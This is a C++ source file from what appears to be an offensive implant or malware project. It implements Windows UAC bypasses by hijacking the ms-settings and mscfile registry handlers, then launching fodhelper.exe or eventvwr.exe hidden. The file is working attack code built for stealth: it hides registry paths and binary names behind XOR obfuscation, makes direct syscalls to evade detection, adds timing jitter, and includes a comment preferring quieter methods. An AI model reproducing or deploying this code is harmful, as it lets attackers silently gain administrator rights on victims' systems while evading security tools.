#include "UACBypass.h"
#include "../utils/Shared.h"
#include "../utils/Logger.h"
#include "../utils/Obfuscator.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include <windows.h>
#include <shellapi.h>

namespace evasion {

namespace {
    // Encrypted strings (XORed with 0x5A)
    // "Software\\Classes\\ms-settings\\Shell\\Open\\command"
    std::wstring kMsSettings = L"\x00\x31\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x38\x35\x37\x27\x27\x31\x27\x0e\x0e\x39\x27\x09\x21\x31\x20\x20\x3d\x3a\x33\x27\x0e\x0e\x07\x3c\x31\x38\x38\x0e\x0e\x1b\x24\x31\x3a\x0e\x0e\x37\x3b\x39\x39\x35\x3a\x30";

    // "DelegateExecute"
    std::wstring kDelegateExecute = L"\x10\x31\x38\x31\x33\x35\x20\x31\x11\x2c\x31\x37\x21\x20\x31";

    // "Software\\Classes\\mscfile\\shell\\open\\command"
    std::wstring kMscFile = L"\x00\x31\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x38\x35\x37\x27\x27\x31\x27\x0e\x0e\x39\x27\x37\x32\x3d\x38\x31\x0e\x0e\x27\x3c\x31\x38\x38\x0e\x0e\x3b\x24\x31\x3a\x0e\x0e\x37\x3b\x39\x39\x35\x3a\x30";

    // "fodhelper.exe"
    std::wstring kFodHelper = L"\x32\x3b\x30\x3c\x31\x38\x24\x31\x26\x54\x31\x2c\x31";

    // "eventvwr.exe"
    std::wstring kEventVwr = L"\x31\x22\x31\x3a\x20\x22\x23\x26\x54\x31\x2c\x31";
}

bool UACBypass::Execute(const std::wstring& command) {
    if (utils::IsAdmin()) return true;

    // Add initial jitter
    Sleep(3000 + (GetTickCount() % 5000));

    LOG_INFO("Attempting UAC Bypass...");

    if (Fodhelper(command)) return true;

    Sleep(5000);
    if (Eventvwr(command)) return true;

    return false;
}

bool UACBypass::Fodhelper(const std::wstring& command) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) return false;

    std::wstring relativePath = utils::DecryptW(kMsSettings);
    HANDLE hKey = NULL;
    status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)command.c_str(), (PVOID)(UINT_PTR)((command.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);

        std::wstring de = utils::DecryptW(kDelegateExecute);
        UNICODE_STRING uDe;
        uDe.Buffer = (PWSTR)de.c_str();
        uDe.Length = (USHORT)(de.length() * sizeof(wchar_t));
        uDe.MaximumLength = uDe.Length + sizeof(wchar_t);
        std::wstring emptyVal = L"";
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uDe, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)emptyVal.c_str(), (PVOID)(UINT_PTR)((emptyVal.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);

        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        ShellExecuteW(NULL, L"open", utils::DecryptW(kFodHelper).c_str(), NULL, NULL, SW_HIDE);

        Sleep(5000);
        return true;
    }

    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return false;
}

bool UACBypass::Eventvwr(const std::wstring& command) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) return false;

    std::wstring relativePath = utils::DecryptW(kMscFile);
    HANDLE hKey = NULL;
    status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)command.c_str(), (PVOID)(UINT_PTR)((command.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        ShellExecuteW(NULL, L"open", utils::DecryptW(kEventVwr).c_str(), NULL, NULL, SW_HIDE);
        Sleep(5000);
        return true;
    }

    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return false;
}

bool UACBypass::Cmstp(const std::wstring& command) {
    (void)command;
    // CMSTP is noisy, skipping for now to focus on stealthier methods
    return false;
}

} // namespace evasion
